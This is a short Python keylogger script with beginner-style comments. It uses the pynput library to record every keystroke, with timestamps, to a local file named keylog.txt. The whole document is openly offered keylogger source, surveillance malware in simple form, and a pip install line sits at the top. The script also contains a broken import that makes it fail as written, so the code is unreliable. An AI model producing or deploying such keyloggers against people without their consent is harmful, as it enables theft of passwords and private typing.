# sudo pip3 install pynput  - for installing pynput Library
# help to read the Keystrokes as the user types in stuff
from pynput.keyboard import key, Listener

#this will log the key stroke into file
import logging

#this is basic configuration where the keystroke will be recorded in file called keylog.txt in specific format.
logging.basicConfig(filename=("keylog.txt"), level=logging.INFO, format=" %(asctime)s - %(message)s")


# The function defined here takes an argument indicating the key pressed by the user
def on_press(key):
    #logs it into file after converting into a string.
    logging.info(str(key))
 

# an instance of a Listener which would be recording keystrokes and pass the function as an argument
with Listener(on_press=on_press) as listener :
    listener.join()


